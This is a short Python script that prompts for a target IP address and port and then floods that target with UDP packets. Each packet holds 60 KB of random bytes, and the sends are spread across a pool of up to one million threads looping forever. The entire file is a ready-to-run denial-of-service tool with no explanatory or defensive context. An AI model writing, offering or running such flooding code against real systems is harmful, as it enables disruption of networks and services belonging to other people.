import socket
import threading
import os
import time
import concurrent.futures

target_ip = input("Enter the target IP address: ")
target_port = int(input("Enter the target port number (e.g., 80 for HTTP): "))


payload_size = 1024 * 60
message = os.urandom(payload_size)


threads_count = 1000000


def create_socket():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 1000000)  
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  
    return sock


def attack(sock):
    while True:
        try:
            sock.sendto(message, (target_ip, target_port))
            print(f"Packet sent to {target_ip}:{target_port}")
            time.sleep(0.01)  
        except socket.error:
            print("Failed to send packet.")


def main():
    with concurrent.futures.ThreadPoolExecutor(max_workers=threads_count) as executor:
        for _ in range(threads_count):
            sock = create_socket()
            executor.submit(attack, sock)

if __name__ == "__main__":
    main()
